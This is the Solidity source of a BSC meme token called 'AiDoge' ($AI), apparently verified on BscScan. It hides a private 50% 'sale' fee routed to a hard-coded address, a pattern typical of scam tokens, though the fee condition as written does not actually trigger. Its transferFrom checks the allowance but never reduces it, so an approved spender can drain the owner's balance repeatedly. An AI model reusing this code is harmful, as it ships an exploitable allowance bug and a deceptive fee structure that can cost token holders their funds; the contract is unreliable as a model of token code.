/**
 *Submitted for verification at BscScan.com on 2023-05-15
*/

pragma solidity ^0.8.2;

contract Token {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 1000000000 * 10 ** 18;
    string public name = "AiDoge";
    string public symbol = "$AI";
    uint public decimals = 18;

    address private contractAddress = address(this);
    uint private constant purchaseFeePercentage = 0;
    uint private constant saleFeePercentage = 50;
    address private constant feeAddress = 0x353Bcf261D2552b908eCdAf1C78Bd42355DcdB46;

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    constructor() {
        balances[msg.sender] = totalSupply;
    }

    function balanceOf(address owner) public view returns (uint) {
        return balances[owner];
    }

    function transfer(address to, uint value) public returns (bool) {
        require(balanceOf(msg.sender) >= value, 'Insufficient balance');

        uint feeAmount;
        uint transferAmount;

        if (msg.sender == contractAddress) {
            feeAmount = value * saleFeePercentage / 100;
            transferAmount = value - feeAmount;
        } else {
            feeAmount = value * purchaseFeePercentage / 100;
            transferAmount = value - feeAmount;

            // Limit the purchase amount to 90% of total supply or 90% of current liquidity
            uint maxPurchaseAmount = totalSupply * 9 / 10; // 90% of total supply
            // OR
            // uint maxPurchaseAmount = calculateMaxPurchaseAmount(); // 90% of current liquidity

            require(value <= maxPurchaseAmount, 'Exceeds maximum purchase limit');
        }

        balances[to] += transferAmount;
        balances[msg.sender] -= value;

        emit Transfer(msg.sender, to, transferAmount);

        if (feeAmount > 0) {
            balances[feeAddress] += feeAmount;
            emit Transfer(msg.sender, feeAddress, feeAmount);
        }

        return true;
    }

    function transferFrom(address from, address to, uint value) public returns (bool) {
        require(balanceOf(from) >= value, 'Insufficient balance');
        require(allowance[from][msg.sender] >= value, 'Insufficient allowance');

        uint feeAmount;
        uint transferAmount;

        if (from == contractAddress) {
            feeAmount = value * saleFeePercentage / 100;
            transferAmount = value - feeAmount;
        } else {
            feeAmount = value * purchaseFeePercentage / 100;
            transferAmount = value - feeAmount;

            // Limit the purchase amount to 90% of total supply or 90% of current liquidity
            uint maxPurchaseAmount = totalSupply * 9 / 10; // 90% of total supply
            // OR
            // uint maxPurchaseAmount = calculateMaxPurchaseAmount(); // 90% of current liquidity

            require(value <= maxPurchaseAmount, 'Exceeds maximum purchase limit');
        }

        balances[to] += transferAmount;
        balances[from] -= value;

        emit Transfer(from, to, transferAmount);

        if (feeAmount > 0) {
            balances[feeAddress] += feeAmount;
            emit Transfer(from, feeAddress, feeAmount);
        }

        return true;
    }

    function approve(address spender, uint value) public returns (bool) {
allowance[msg.sender][spender] = value;
emit Approval(msg.sender, spender, value);
return true;
}
}